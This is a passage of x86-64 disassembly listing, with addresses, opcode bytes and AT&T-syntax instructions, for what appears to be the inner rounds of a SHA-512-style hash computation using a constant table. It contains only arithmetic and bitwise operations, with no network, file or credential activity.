   140008106:	41 c1 e8 02          	shr    $0x2,%r8d
   14000810a:	c1 e3 04             	shl    $0x4,%ebx
   14000810d:	0b da                	or     %edx,%ebx
   14000810f:	89 7c 24 08          	mov    %edi,0x8(%rsp)
   140008113:	8b d6                	mov    %esi,%edx
   140008115:	c1 e2 1e             	shl    $0x1e,%edx
   140008118:	44 0b c2             	or     %edx,%r8d
   14000811b:	8b d6                	mov    %esi,%edx
   14000811d:	41 33 d8             	xor    %r8d,%ebx
   140008120:	c1 e2 19             	shl    $0x19,%edx
   140008123:	45 8b c4             	mov    %r12d,%r8d
   140008126:	41 c1 e8 07          	shr    $0x7,%r8d
   14000812a:	44 0b c2             	or     %edx,%r8d
   14000812d:	8b 54 24 20          	mov    0x20(%rsp),%edx
   140008131:	41 33 d8             	xor    %r8d,%ebx
   140008134:	44 33 da             	xor    %edx,%r11d
   140008137:	23 54 24 58          	and    0x58(%rsp),%edx
   14000813b:	44 23 de             	and    %esi,%r11d
   14000813e:	44 8b 44 24 0c       	mov    0xc(%rsp),%r8d
   140008143:	44 33 da             	xor    %edx,%r11d
   140008146:	44 03 db             	add    %ebx,%r11d
   140008149:	43 8d 14 07          	lea    (%r15,%r8,1),%edx
   14000814d:	41 3b d0             	cmp    %r8d,%edx
   140008150:	89 54 24 1c          	mov    %edx,0x1c(%rsp)
   140008154:	8b 55 f8             	mov    -0x8(%rbp),%edx
   140008157:	47 8d 34 1f          	lea    (%r15,%r11,1),%r14d
   14000815b:	83 d2 00             	adc    $0x0,%edx
   14000815e:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   140008163:	41 c1 e1 1e          	shl    $0x1e,%r9d
   140008167:	03 fa                	add    %edx,%edi
   140008169:	41 c1 e2 19          	shl    $0x19,%r10d
   14000816d:	44 8b c6             	mov    %esi,%r8d
   140008170:	41 c1 e8 07          	shr    $0x7,%r8d
   140008174:	45 0b d0             	or     %r8d,%r10d
   140008177:	89 7c 24 18          	mov    %edi,0x18(%rsp)
   14000817b:	48 8b 54 24 18       	mov    0x18(%rsp),%rdx
   140008180:	44 8b c6             	mov    %esi,%r8d
   140008183:	41 c1 e8 02          	shr    $0x2,%r8d
   140008187:	45 0b c8             	or     %r8d,%r9d
   14000818a:	89 7c 24 0c          	mov    %edi,0xc(%rsp)
   14000818e:	45 33 d1             	xor    %r9d,%r10d
   140008191:	44 8b c6             	mov    %esi,%r8d
   140008194:	8b 75 10             	mov    0x10(%rbp),%esi
   140008197:	45 8b cc             	mov    %r12d,%r9d
   14000819a:	23 74 24 50          	and    0x50(%rsp),%esi
   14000819e:	41 c1 e9 1c          	shr    $0x1c,%r9d
   1400081a2:	41 c1 e0 04          	shl    $0x4,%r8d
   1400081a6:	45 0b c8             	or     %r8d,%r9d
   1400081a9:	45 33 d1             	xor    %r9d,%r10d
   1400081ac:	44 8b 4d f4          	mov    -0xc(%rbp),%r9d
   1400081b0:	44 33 4c 24 50       	xor    0x50(%rsp),%r9d
   1400081b5:	45 23 cc             	and    %r12d,%r9d
   1400081b8:	44 33 ce             	xor    %esi,%r9d
   1400081bb:	45 03 d1             	add    %r9d,%r10d
   1400081be:	44 8b 44 24 08       	mov    0x8(%rsp),%r8d
   1400081c3:	44 3b db             	cmp    %ebx,%r11d
   1400081c6:	44 8b 65 fc          	mov    -0x4(%rbp),%r12d
   1400081ca:	41 83 d0 00          	adc    $0x0,%r8d
   1400081ce:	45 3b f7             	cmp    %r15d,%r14d
   1400081d1:	4c 8b f2             	mov    %rdx,%r14
   1400081d4:	45 13 c2             	adc    %r10d,%r8d
   1400081d7:	49 c1 ee 20          	shr    $0x20,%r14
   1400081db:	44 89 44 24 08       	mov    %r8d,0x8(%rsp)
   1400081e0:	4c 8d 15 99 97 ff ff 	lea    -0x6867(%rip),%r10        # 0x140001980
   1400081e7:	48 c1 e9 20          	shr    $0x20,%rcx
   1400081eb:	45 8b c6             	mov    %r14d,%r8d
   1400081ee:	44 23 c1             	and    %ecx,%r8d
   1400081f1:	45 8b ce             	mov    %r14d,%r9d
   1400081f4:	41 c1 e1 17          	shl    $0x17,%r9d
   1400081f8:	45 8b fe             	mov    %r14d,%r15d
   1400081fb:	41 8b f6             	mov    %r14d,%esi
   1400081fe:	41 f7 d7             	not    %r15d
   140008201:	c1 ee 12             	shr    $0x12,%esi
   140008204:	44 23 f8             	and    %eax,%r15d
   140008207:	45 33 f8             	xor    %r8d,%r15d
   14000820a:	44 8b c7             	mov    %edi,%r8d
   14000820d:	41 c1 e0 0e          	shl    $0xe,%r8d
   140008211:	41 0b f0             	or     %r8d,%esi
   140008214:	44 8b c7             	mov    %edi,%r8d
   140008217:	41 c1 e8 09          	shr    $0x9,%r8d
   14000821b:	45 0b c8             	or     %r8d,%r9d
   14000821e:	44 8b c7             	mov    %edi,%r8d
   140008221:	41 c1 e0 12          	shl    $0x12,%r8d
   140008225:	41 33 f1             	xor    %r9d,%esi
   140008228:	45 8b ce             	mov    %r14d,%r9d
   14000822b:	41 c1 e9 0e          	shr    $0xe,%r9d
   14000822f:	45 0b c8             	or     %r8d,%r9d
   140008232:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   140008237:	41 33 f1             	xor    %r9d,%esi
   14000823a:	45 8b ce             	mov    %r14d,%r9d
   14000823d:	41 c1 e9 09          	shr    $0x9,%r9d
   140008241:	41 03 f7             	add    %r15d,%esi
   140008244:	43 8b 7c 10 1c       	mov    0x1c(%r8,%r10,1),%edi
   140008249:	46 8b 9c 05 cc 00 00 	mov    0xcc(%rbp,%r8,1),%r11d
   140008250:	00 
   140008251:	44 8b 44 24 0c       	mov    0xc(%rsp),%r8d
   140008256:	41 c1 e0 17          	shl    $0x17,%r8d
   14000825a:	45 0b c8             	or     %r8d,%r9d
   14000825d:	8d 1c 37             	lea    (%rdi,%rsi,1),%ebx
   140008260:	44 8b 44 24 0c       	mov    0xc(%rsp),%r8d
   140008265:	46 8d 14 1b          	lea    (%rbx,%r11,1),%r10d
   140008269:	41 c1 e8 12          	shr    $0x12,%r8d
   14000826d:	45 03 e2             	add    %r10d,%r12d
   140008270:	44 89 4c 24 04       	mov    %r9d,0x4(%rsp)
   140008275:	45 8b ce             	mov    %r14d,%r9d
   140008278:	41 c1 e1 0e          	shl    $0xe,%r9d
   14000827c:	45 0b c8             	or     %r8d,%r9d
   14000827f:	41 c1 e6 12          	shl    $0x12,%r14d
   140008283:	44 31 4c 24 04       	xor    %r9d,0x4(%rsp)
   140008288:	44 8b 44 24 0c       	mov    0xc(%rsp),%r8d
   14000828d:	41 c1 e8 0e          	shr    $0xe,%r8d
   140008291:	45 0b f0             	or     %r8d,%r14d
   140008294:	44 8b 44 24 0c       	mov    0xc(%rsp),%r8d
   140008299:	44 31 74 24 04       	xor    %r14d,0x4(%rsp)
   14000829e:	45 8b c8             	mov    %r8d,%r9d
   1400082a1:	44 23 44 24 40       	and    0x40(%rsp),%r8d
   1400082a6:	41 f7 d1             	not    %r9d
   1400082a9:	45 23 cd             	and    %r13d,%r9d
   1400082ac:	44 8b 6c 24 08       	mov    0x8(%rsp),%r13d
   1400082b1:	45 33 c8             	xor    %r8d,%r9d
   1400082b4:	44 8b 44 24 04       	mov    0x4(%rsp),%r8d
   1400082b9:	45 03 c1             	add    %r9d,%r8d
   1400082bc:	4c 8d 0d bd 96 ff ff 	lea    -0x6943(%rip),%r9        # 0x140001980
   1400082c3:	41 3b f7             	cmp    %r15d,%esi
   1400082c6:	41 83 d0 00          	adc    $0x0,%r8d
   1400082ca:	45 3b d3             	cmp    %r11d,%r10d
   1400082cd:	4c 8b 5c 24 48       	mov    0x48(%rsp),%r11
   1400082d2:	41 83 d0 00          	adc    $0x0,%r8d
   1400082d6:	3b df                	cmp    %edi,%ebx
   1400082d8:	41 8b fd             	mov    %r13d,%edi
   1400082db:	41 83 d0 00          	adc    $0x0,%r8d
   1400082df:	44 3b 65 00          	cmp    0x0(%rbp),%r12d
   1400082e3:	46 13 84 1d c8 00 00 	adc    0xc8(%rbp,%r11,1),%r8d
   1400082ea:	00 
   1400082eb:	47 03 44 0b 18       	add    0x18(%r11,%r9,1),%r8d
   1400082f0:	44 03 45 04          	add    0x4(%rbp),%r8d
   1400082f4:	44 89 44 24 04       	mov    %r8d,0x4(%rsp)
   1400082f9:	44 8b 74 24 30       	mov    0x30(%rsp),%r14d
   1400082fe:	45 8b cd             	mov    %r13d,%r9d
   140008301:	8b 74 24 04          	mov    0x4(%rsp),%esi
   140008305:	45 8b c6             	mov    %r14d,%r8d
   140008308:	8b 5c 24 24          	mov    0x24(%rsp),%ebx
   14000830c:	45 8b dd             	mov    %r13d,%r11d
   14000830f:	33 5c 24 58          	xor    0x58(%rsp),%ebx
   140008313:	45 8b d5             	mov    %r13d,%r10d
   140008316:	41 c1 e9 02          	shr    $0x2,%r9d
   14000831a:	41 23 de             	and    %r14d,%ebx
   14000831d:	41 c1 e8 1c          	shr    $0x1c,%r8d
   140008321:	c1 e7 04             	shl    $0x4,%edi
   140008324:	41 0b f8             	or     %r8d,%edi
   140008327:	45 8b c6             	mov    %r14d,%r8d
   14000832a:	41 c1 e0 1e          	shl    $0x1e,%r8d
   14000832e:	45 0b c8             	or     %r8d,%r9d
   140008331:	45 8b c6             	mov    %r14d,%r8d
   140008334:	41 33 f9             	xor    %r9d,%edi
   140008337:	41 c1 e0 19          	shl    $0x19,%r8d
   14000833b:	45 8b cd             	mov    %r13d,%r9d
   14000833e:	41 c1 e9 07          	shr    $0x7,%r9d
   140008342:	45 0b c8             	or     %r8d,%r9d
   140008345:	44 8b 44 24 24       	mov    0x24(%rsp),%r8d
   14000834a:	44 23 44 24 58       	and    0x58(%rsp),%r8d
   14000834f:	41 33 f9             	xor    %r9d,%edi
   140008352:	44 8b 4c 24 20       	mov    0x20(%rsp),%r9d
   140008357:	41 33 d8             	xor    %r8d,%ebx
   14000835a:	03 df                	add    %edi,%ebx
   14000835c:	47 8d 04 0c          	lea    (%r12,%r9,1),%r8d
   140008360:	45 3b c1             	cmp    %r9d,%r8d
   140008363:	44 89 44 24 1c       	mov    %r8d,0x1c(%rsp)
   140008368:	46 8d 3c 23          	lea    (%rbx,%r12,1),%r15d
   14000836c:	45 8b ce             	mov    %r14d,%r9d
   14000836f:	83 d6 00             	adc    $0x0,%esi
   140008372:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   140008377:	03 75 08             	add    0x8(%rbp),%esi
   14000837a:	41 c1 e9 07          	shr    $0x7,%r9d
   14000837e:	41 c1 e2 1e          	shl    $0x1e,%r10d
   140008382:	41 c1 e3 19          	shl    $0x19,%r11d
   140008386:	45 0b d9             	or     %r9d,%r11d
   140008389:	89 74 24 18          	mov    %esi,0x18(%rsp)
   14000838d:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   140008392:	45 8b ce             	mov    %r14d,%r9d
   140008395:	41 c1 e9 02          	shr    $0x2,%r9d
   140008399:	45 0b d1             	or     %r9d,%r10d
   14000839c:	89 74 24 10          	mov    %esi,0x10(%rsp)
   1400083a0:	45 33 da             	xor    %r10d,%r11d
   1400083a3:	45 8b ce             	mov    %r14d,%r9d
   1400083a6:	41 c1 e1 04          	shl    $0x4,%r9d
   1400083aa:	45 8b d5             	mov    %r13d,%r10d
   1400083ad:	41 c1 ea 1c          	shr    $0x1c,%r10d
   1400083b1:	45 0b d1             	or     %r9d,%r10d
   1400083b4:	44 8b 0c 24          	mov    (%rsp),%r9d
   1400083b8:	45 33 da             	xor    %r10d,%r11d
   1400083bb:	45 8b d1             	mov    %r9d,%r10d
   1400083be:	44 23 4c 24 50       	and    0x50(%rsp),%r9d
   1400083c3:	44 33 54 24 50       	xor    0x50(%rsp),%r10d
   1400083c8:	45 23 d5             	and    %r13d,%r10d
   1400083cb:	45 33 d1             	xor    %r9d,%r10d
   1400083ce:	44 8b 4c 24 04       	mov    0x4(%rsp),%r9d
   1400083d3:	45 03 da             	add    %r10d,%r11d
   1400083d6:	45 3b fc             	cmp    %r12d,%r15d
   1400083d9:	4d 8b f8             	mov    %r8,%r15
   1400083dc:	41 83 d1 00          	adc    $0x0,%r9d
   1400083e0:	3b df                	cmp    %edi,%ebx
   1400083e2:	45 13 cb             	adc    %r11d,%r9d
   1400083e5:	49 c1 ef 20          	shr    $0x20,%r15
   1400083e9:	44 89 4c 24 04       	mov    %r9d,0x4(%rsp)
   1400083ee:	45 8b e7             	mov    %r15d,%r12d
   1400083f1:	48 c1 ea 20          	shr    $0x20,%rdx
   1400083f5:	41 f7 d4             	not    %r12d
   1400083f8:	44 23 e1             	and    %ecx,%r12d
   1400083fb:	44 8b ca             	mov    %edx,%r9d
   1400083fe:	45 23 cf             	and    %r15d,%r9d
   140008401:	45 8b f7             	mov    %r15d,%r14d
   140008404:	45 33 e1             	xor    %r9d,%r12d
   140008407:	41 c1 ee 12          	shr    $0x12,%r14d
   14000840b:	44 8b ce             	mov    %esi,%r9d
   14000840e:	45 8b d7             	mov    %r15d,%r10d
   140008411:	41 c1 e1 0e          	shl    $0xe,%r9d
   140008415:	45 0b f1             	or     %r9d,%r14d
   140008418:	41 c1 e2 17          	shl    $0x17,%r10d
   14000841c:	44 8b ce             	mov    %esi,%r9d
   14000841f:	41 c1 e9 09          	shr    $0x9,%r9d
   140008423:	45 0b d1             	or     %r9d,%r10d
   140008426:	45 8b cf             	mov    %r15d,%r9d
   140008429:	41 c1 e9 0e          	shr    $0xe,%r9d
   14000842d:	45 33 f2             	xor    %r10d,%r14d
   140008430:	44 8b d6             	mov    %esi,%r10d
   140008433:	41 c1 e2 12          	shl    $0x12,%r10d
   140008437:	45 0b d1             	or     %r9d,%r10d
   14000843a:	4c 8b 4c 24 48       	mov    0x48(%rsp),%r9
   14000843f:	45 33 f2             	xor    %r10d,%r14d
   140008442:	4c 8d 15 37 95 ff ff 	lea    -0x6ac9(%rip),%r10        # 0x140001980
   140008449:	45 03 f4             	add    %r12d,%r14d
   14000844c:	43 8b 74 11 24       	mov    0x24(%r9,%r10,1),%esi
   140008451:	45 8b d7             	mov    %r15d,%r10d
   140008454:	42 8b 9c 0d d4 00 00 	mov    0xd4(%rbp,%r9,1),%ebx
   14000845b:	00 
   14000845c:	44 8b 4c 24 10       	mov    0x10(%rsp),%r9d
   140008461:	41 c1 e1 17          	shl    $0x17,%r9d
   140008465:	41 c1 ea 09          	shr    $0x9,%r10d
   140008469:	41 8d 3c 36          	lea    (%r14,%rsi,1),%edi
   14000846d:	45 0b d1             	or     %r9d,%r10d
   140008470:	44 8d 1c 1f          	lea    (%rdi,%rbx,1),%r11d
   140008474:	44 8b 4c 24 10       	mov    0x10(%rsp),%r9d
   140008479:	45 8d 2c 03          	lea    (%r11,%rax,1),%r13d
   14000847d:	41 c1 e9 12          	shr    $0x12,%r9d
   140008481:	44 89 54 24 2c       	mov    %r10d,0x2c(%rsp)
   140008486:	45 8b d7             	mov    %r15d,%r10d
   140008489:	41 c1 e7 12          	shl    $0x12,%r15d
   14000848d:	41 c1 e2 0e          	shl    $0xe,%r10d
   140008491:	45 0b d1             	or     %r9d,%r10d
   140008494:	44 8b 4c 24 10       	mov    0x10(%rsp),%r9d
   140008499:	44 31 54 24 2c       	xor    %r10d,0x2c(%rsp)
   14000849e:	41 c1 e9 0e          	shr    $0xe,%r9d
   1400084a2:	45 0b cf             	or     %r15d,%r9d
   1400084a5:	44 8b 7c 24 2c       	mov    0x2c(%rsp),%r15d
   1400084aa:	45 33 f9             	xor    %r9d,%r15d
   1400084ad:	44 8b 4c 24 10       	mov    0x10(%rsp),%r9d
   1400084b2:	45 8b d1             	mov    %r9d,%r10d
   1400084b5:	44 23 4c 24 0c       	and    0xc(%rsp),%r9d
   1400084ba:	41 f7 d2             	not    %r10d
   1400084bd:	44 23 54 24 40       	and    0x40(%rsp),%r10d
   1400084c2:	45 33 d1             	xor    %r9d,%r10d
   1400084c5:	4c 8d 0d b4 94 ff ff 	lea    -0x6b4c(%rip),%r9        # 0x140001980
   1400084cc:	45 03 fa             	add    %r10d,%r15d
   1400084cf:	45 3b f4             	cmp    %r12d,%r14d
   1400084d2:	44 8b 74 24 04       	mov    0x4(%rsp),%r14d
   1400084d7:	41 83 d7 00          	adc    $0x0,%r15d
   1400084db:	44 3b db             	cmp    %ebx,%r11d
   1400084de:	8b 5c 24 30          	mov    0x30(%rsp),%ebx
   1400084e2:	41 83 d7 00          	adc    $0x0,%r15d
   1400084e6:	3b fe                	cmp    %esi,%edi
   1400084e8:	8b 74 24 20          	mov    0x20(%rsp),%esi
   1400084ec:	41 8b fe             	mov    %r14d,%edi
   1400084ef:	41 83 d7 00          	adc    $0x0,%r15d
   1400084f3:	44 3b e8             	cmp    %eax,%r13d
   1400084f6:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   1400084fb:	44 13 bc 05 d0 00 00 	adc    0xd0(%rbp,%rax,1),%r15d
   140008502:	00 
   140008503:	46 03 7c 08 20       	add    0x20(%rax,%r9,1),%r15d
   140008508:	8b c6                	mov    %esi,%eax
   14000850a:	44 03 7c 24 70       	add    0x70(%rsp),%r15d
   14000850f:	45 8b ce             	mov    %r14d,%r9d
   140008512:	c1 e8 1c             	shr    $0x1c,%eax
   140008515:	41 c1 e9 02          	shr    $0x2,%r9d
   140008519:	c1 e7 04             	shl    $0x4,%edi
   14000851c:	0b f8                	or     %eax,%edi
   14000851e:	8b c6                	mov    %esi,%eax
   140008520:	c1 e0 1e             	shl    $0x1e,%eax
   140008523:	44 0b c8             	or     %eax,%r9d
   140008526:	8b c6                	mov    %esi,%eax
   140008528:	41 33 f9             	xor    %r9d,%edi
   14000852b:	c1 e0 19             	shl    $0x19,%eax
   14000852e:	45 8b ce             	mov    %r14d,%r9d
   140008531:	41 c1 e9 07          	shr    $0x7,%r9d
   140008535:	44 0b c8             	or     %eax,%r9d
   140008538:	8b 44 24 24          	mov    0x24(%rsp),%eax
   14000853c:	33 d8                	xor    %eax,%ebx
   14000853e:	41 33 f9             	xor    %r9d,%edi
   140008541:	23 44 24 30          	and    0x30(%rsp),%eax
   140008545:	23 de                	and    %esi,%ebx
   140008547:	33 d8                	xor    %eax,%ebx
   140008549:	44 8b 4c 24 58       	mov    0x58(%rsp),%r9d
   14000854e:	45 8b d6             	mov    %r14d,%r10d
   140008551:	03 df                	add    %edi,%ebx
   140008553:	45 8b de             	mov    %r14d,%r11d
   140008556:	43 8d 04 29          	lea    (%r9,%r13,1),%eax
   14000855a:	41 3b c1             	cmp    %r9d,%eax
   14000855d:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
   140008561:	41 8b c7             	mov    %r15d,%eax
   140008564:	46 8d 24 2b          	lea    (%rbx,%r13,1),%r12d
   140008568:	83 d0 00             	adc    $0x0,%eax
   14000856b:	44 89 64 24 58       	mov    %r12d,0x58(%rsp)
   140008570:	03 44 24 50          	add    0x50(%rsp),%eax
   140008574:	89 44 24 18          	mov    %eax,0x18(%rsp)
   140008578:	4c 8b 4c 24 18       	mov    0x18(%rsp),%r9
   14000857d:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140008581:	49 8b c1             	mov    %r9,%rax
   140008584:	48 c1 e8 20          	shr    $0x20,%rax
   140008588:	41 c1 e2 1e          	shl    $0x1e,%r10d
   14000858c:	48 89 45 40          	mov    %rax,0x40(%rbp)
   140008590:	89 45 14             	mov    %eax,0x14(%rbp)
   140008593:	8b c6                	mov    %esi,%eax
   140008595:	c1 e8 07             	shr    $0x7,%eax
   140008598:	41 c1 e3 19          	shl    $0x19,%r11d
   14000859c:	44 0b d8             	or     %eax,%r11d
   14000859f:	8b c6                	mov    %esi,%eax
   1400085a1:	c1 e8 02             	shr    $0x2,%eax
   1400085a4:	44 0b d0             	or     %eax,%r10d
   1400085a7:	8b c6                	mov    %esi,%eax
   1400085a9:	45 33 da             	xor    %r10d,%r11d
   1400085ac:	c1 e0 04             	shl    $0x4,%eax
   1400085af:	45 8b d6             	mov    %r14d,%r10d
   1400085b2:	41 c1 ea 1c          	shr    $0x1c,%r10d
   1400085b6:	44 0b d0             	or     %eax,%r10d
   1400085b9:	8b 04 24             	mov    (%rsp),%eax
   1400085bc:	45 33 da             	xor    %r10d,%r11d
   1400085bf:	44 8b 54 24 08       	mov    0x8(%rsp),%r10d
   1400085c4:	44 33 d0             	xor    %eax,%r10d
   1400085c7:	23 44 24 08          	and    0x8(%rsp),%eax
   1400085cb:	45 23 d6             	and    %r14d,%r10d
   1400085ce:	44 33 d0             	xor    %eax,%r10d
   1400085d1:	45 03 da             	add    %r10d,%r11d
   1400085d4:	4d 8b d1             	mov    %r9,%r10
   1400085d7:	45 3b e5             	cmp    %r13d,%r12d
   1400085da:	41 83 d7 00          	adc    $0x0,%r15d
   1400085de:	3b df                	cmp    %edi,%ebx
   1400085e0:	45 13 fb             	adc    %r11d,%r15d
   1400085e3:	44 8b 5c 24 28       	mov    0x28(%rsp),%r11d
   1400085e8:	49 c1 ea 20          	shr    $0x20,%r10
   1400085ec:	45 8b e2             	mov    %r10d,%r12d
   1400085ef:	4c 89 54 24 60       	mov    %r10,0x60(%rsp)
   1400085f4:	45 8b f2             	mov    %r10d,%r14d
   1400085f7:	49 c1 e8 20          	shr    $0x20,%r8
   1400085fb:	41 c1 ee 0e          	shr    $0xe,%r14d
   1400085ff:	41 f7 d4             	not    %r12d
   140008602:	41 8b c0             	mov    %r8d,%eax
   140008605:	44 89 7c 24 2c       	mov    %r15d,0x2c(%rsp)
   14000860a:	41 23 c2             	and    %r10d,%eax
   14000860d:	45 8b fa             	mov    %r10d,%r15d
   140008610:	41 c1 ea 12          	shr    $0x12,%r10d
   140008614:	44 23 e2             	and    %edx,%r12d
   140008617:	44 33 e0             	xor    %eax,%r12d
   14000861a:	41 8b c3             	mov    %r11d,%eax
   14000861d:	c1 e0 12             	shl    $0x12,%eax
   140008620:	44 0b f0             	or     %eax,%r14d
   140008623:	41 8b c3             	mov    %r11d,%eax
   140008626:	c1 e0 0e             	shl    $0xe,%eax
   140008629:	44 0b d0             	or     %eax,%r10d
   14000862c:	41 8b c3             	mov    %r11d,%eax
   14000862f:	45 33 f2             	xor    %r10d,%r14d
   140008632:	c1 e8 09             	shr    $0x9,%eax
   140008635:	45 8b d7             	mov    %r15d,%r10d
   140008638:	41 c1 e2 17          	shl    $0x17,%r10d
   14000863c:	44 0b d0             	or     %eax,%r10d
   14000863f:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140008644:	45 33 f2             	xor    %r10d,%r14d
   140008647:	4c 8d 15 32 93 ff ff 	lea    -0x6cce(%rip),%r10        # 0x140001980
   14000864e:	45 03 f4             	add    %r12d,%r14d
   140008651:	42 8b 74 10 2c       	mov    0x2c(%rax,%r10,1),%esi
   140008656:	8b 9c 05 dc 00 00 00 	mov    0xdc(%rbp,%rax,1),%ebx
   14000865d:	42 8d 3c 36          	lea    (%rsi,%r14,1),%edi
   140008661:	44 8d 1c 1f          	lea    (%rdi,%rbx,1),%r11d
   140008665:	4c 8b 54 24 60       	mov    0x60(%rsp),%r10
   14000866a:	45 8d 2c 0b          	lea    (%r11,%rcx,1),%r13d
   14000866e:	8b 44 24 28          	mov    0x28(%rsp),%eax
   140008672:	c1 e8 0e             	shr    $0xe,%eax
   140008675:	41 c1 e2 12          	shl    $0x12,%r10d
   140008679:	44 0b d0             	or     %eax,%r10d
   14000867c:	8b 44 24 28          	mov    0x28(%rsp),%eax
   140008680:	c1 e0 17             	shl    $0x17,%eax
   140008683:	4c 89 54 24 60       	mov    %r10,0x60(%rsp)
   140008688:	45 8b d7             	mov    %r15d,%r10d
   14000868b:	41 c1 e7 0e          	shl    $0xe,%r15d
   14000868f:	41 c1 ea 09          	shr    $0x9,%r10d
   140008693:	44 0b d0             	or     %eax,%r10d
   140008696:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   14000869b:	41 33 c2             	xor    %r10d,%eax
   14000869e:	44 8b 54 24 28       	mov    0x28(%rsp),%r10d
   1400086a3:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400086a8:	41 8b c2             	mov    %r10d,%eax
   1400086ab:	c1 e8 12             	shr    $0x12,%eax
   1400086ae:	41 f7 d2             	not    %r10d
   1400086b1:	44 23 54 24 0c       	and    0xc(%rsp),%r10d
   1400086b6:	44 0b f8             	or     %eax,%r15d
   1400086b9:	44 31 7c 24 60       	xor    %r15d,0x60(%rsp)
   1400086be:	8b 44 24 10          	mov    0x10(%rsp),%eax
   1400086c2:	23 44 24 28          	and    0x28(%rsp),%eax
   1400086c6:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   1400086cb:	44 33 d0             	xor    %eax,%r10d
   1400086ce:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   1400086d3:	45 03 fa             	add    %r10d,%r15d
   1400086d6:	45 3b f4             	cmp    %r12d,%r14d
   1400086d9:	44 8b 74 24 2c       	mov    0x2c(%rsp),%r14d
   1400086de:	41 83 d7 00          	adc    $0x0,%r15d
   1400086e2:	44 3b e9             	cmp    %ecx,%r13d
   1400086e5:	48 8d 0d 94 92 ff ff 	lea    -0x6d6c(%rip),%rcx        # 0x140001980
   1400086ec:	41 83 d7 00          	adc    $0x0,%r15d
   1400086f0:	44 3b db             	cmp    %ebx,%r11d
   1400086f3:	44 8b 5c 24 24       	mov    0x24(%rsp),%r11d
   1400086f8:	8b 5c 24 30          	mov    0x30(%rsp),%ebx
   1400086fc:	41 83 d7 00          	adc    $0x0,%r15d
   140008700:	3b fe                	cmp    %esi,%edi
   140008702:	8b 74 24 58          	mov    0x58(%rsp),%esi
   140008706:	41 8b fe             	mov    %r14d,%edi
   140008709:	44 13 bc 05 d8 00 00 	adc    0xd8(%rbp,%rax,1),%r15d
   140008710:	00 
   140008711:	44 03 7c 08 28       	add    0x28(%rax,%rcx,1),%r15d
   140008716:	8b c6                	mov    %esi,%eax
   140008718:	33 5c 24 20          	xor    0x20(%rsp),%ebx
   14000871c:	41 8b ce             	mov    %r14d,%ecx
   14000871f:	44 03 7c 24 40       	add    0x40(%rsp),%r15d
   140008724:	23 de                	and    %esi,%ebx
   140008726:	c1 e8 1c             	shr    $0x1c,%eax
   140008729:	c1 e9 02             	shr    $0x2,%ecx
   14000872c:	c1 e7 04             	shl    $0x4,%edi
   14000872f:	0b f8                	or     %eax,%edi
   140008731:	8b c6                	mov    %esi,%eax
   140008733:	c1 e0 1e             	shl    $0x1e,%eax
   140008736:	0b c8                	or     %eax,%ecx
   140008738:	8b c6                	mov    %esi,%eax
   14000873a:	c1 e0 19             	shl    $0x19,%eax
   14000873d:	33 f9                	xor    %ecx,%edi
   14000873f:	41 8b ce             	mov    %r14d,%ecx
   140008742:	c1 e9 07             	shr    $0x7,%ecx
   140008745:	0b c8                	or     %eax,%ecx
   140008747:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000874b:	23 44 24 30          	and    0x30(%rsp),%eax
   14000874f:	33 f9                	xor    %ecx,%edi
   140008751:	33 d8                	xor    %eax,%ebx
   140008753:	43 8d 04 2b          	lea    (%r11,%r13,1),%eax
   140008757:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
   14000875b:	03 df                	add    %edi,%ebx
   14000875d:	41 3b c3             	cmp    %r11d,%eax
   140008760:	41 8b c7             	mov    %r15d,%eax
   140008763:	83 d0 00             	adc    $0x0,%eax
   140008766:	03 04 24             	add    (%rsp),%eax
   140008769:	89 44 24 18          	mov    %eax,0x18(%rsp)
   14000876d:	4c 8b 54 24 18       	mov    0x18(%rsp),%r10
   140008772:	89 44 24 68          	mov    %eax,0x68(%rsp)
   140008776:	89 45 18             	mov    %eax,0x18(%rbp)
   140008779:	49 8b c2             	mov    %r10,%rax
   14000877c:	48 c1 e8 20          	shr    $0x20,%rax
   140008780:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   140008784:	89 45 1c             	mov    %eax,0x1c(%rbp)
   140008787:	46 8d 24 2b          	lea    (%rbx,%r13,1),%r12d
   14000878b:	8b c6                	mov    %esi,%eax
   14000878d:	c1 e8 07             	shr    $0x7,%eax
   140008790:	41 8b ce             	mov    %r14d,%ecx
   140008793:	c1 e1 1e             	shl    $0x1e,%ecx
   140008796:	45 8b de             	mov    %r14d,%r11d
   140008799:	41 c1 e3 19          	shl    $0x19,%r11d
   14000879d:	44 0b d8             	or     %eax,%r11d
   1400087a0:	44 89 64 24 24       	mov    %r12d,0x24(%rsp)
   1400087a5:	8b c6                	mov    %esi,%eax
   1400087a7:	c1 e8 02             	shr    $0x2,%eax
   1400087aa:	0b c8                	or     %eax,%ecx
   1400087ac:	8b c6                	mov    %esi,%eax
   1400087ae:	44 33 d9             	xor    %ecx,%r11d
   1400087b1:	c1 e0 04             	shl    $0x4,%eax
   1400087b4:	41 8b ce             	mov    %r14d,%ecx
   1400087b7:	c1 e9 1c             	shr    $0x1c,%ecx
   1400087ba:	0b c8                	or     %eax,%ecx
   1400087bc:	8b 44 24 04          	mov    0x4(%rsp),%eax
   1400087c0:	44 33 d9             	xor    %ecx,%r11d
   1400087c3:	8b 4c 24 08          	mov    0x8(%rsp),%ecx
   1400087c7:	33 c8                	xor    %eax,%ecx
   1400087c9:	23 44 24 08          	and    0x8(%rsp),%eax
   1400087cd:	41 23 ce             	and    %r14d,%ecx
   1400087d0:	33 c8                	xor    %eax,%ecx
   1400087d2:	44 03 d9             	add    %ecx,%r11d
   1400087d5:	49 8b ca             	mov    %r10,%rcx
   1400087d8:	45 3b e5             	cmp    %r13d,%r12d
   1400087db:	41 83 d7 00          	adc    $0x0,%r15d
   1400087df:	3b df                	cmp    %edi,%ebx
   1400087e1:	45 13 fb             	adc    %r11d,%r15d
   1400087e4:	44 8b 5c 24 68       	mov    0x68(%rsp),%r11d
